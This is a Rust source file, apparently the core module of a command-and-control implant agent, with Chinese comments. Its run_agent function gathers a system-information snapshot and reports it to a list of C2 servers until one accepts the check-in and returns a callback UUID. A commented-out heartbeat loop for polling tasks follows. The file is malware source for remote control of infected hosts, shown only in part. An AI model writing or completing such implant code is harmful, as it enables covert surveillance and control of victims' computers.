use crate::c2::C2;
// src/core.rs
use crate::config::Config;
use crate::models::message::{ReqCheckin, ReqStagingRSA, RespCheckin, RespStagingRSA};

pub fn run_agent(config: Config) {
    println!("[*] Agent 启动，开始初始化...");

    // 1. 【核心】只在这里调用唯一一次，获取系统信息快照
    // 此时内存中持有了这个结构体的所有权
    let checkin_info: ReqCheckin = ReqCheckin::get_checkin_info(config.payload_uuid);
    // println!("Checkin Info: {:#?}", checkin_info);

    // 2. 将数据发送给 C2 控端
    // 假设上线成功，控端会返回一个新的 Callback_UUID
    let mut flag = false;
    for i in 0..config.c2_profiles.len() {
        let call = config.c2_profiles[i].checkin(&config.payload_uuid, &checkin_info);
        println!("{:?}", call);
        if let Ok(callback_uuid) = call {
            println!("[+] 上线成功！拿到 Callback UUID: {:?}", callback_uuid);
            flag = true;
            break;
        } else {
            println!("")
        }
    }
    if !flag {
        println!("[-] 所有 C2 节点均无法连接，程序退出");
        return;
    }
}

// async fn enter_beacon_loop(callback_uuid: uuid::Uuid) {
//     loop {
//         // 正常的 get_tasking 心跳循环...
//         println!("[*] 心跳中...");
//         tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
//     }
// }
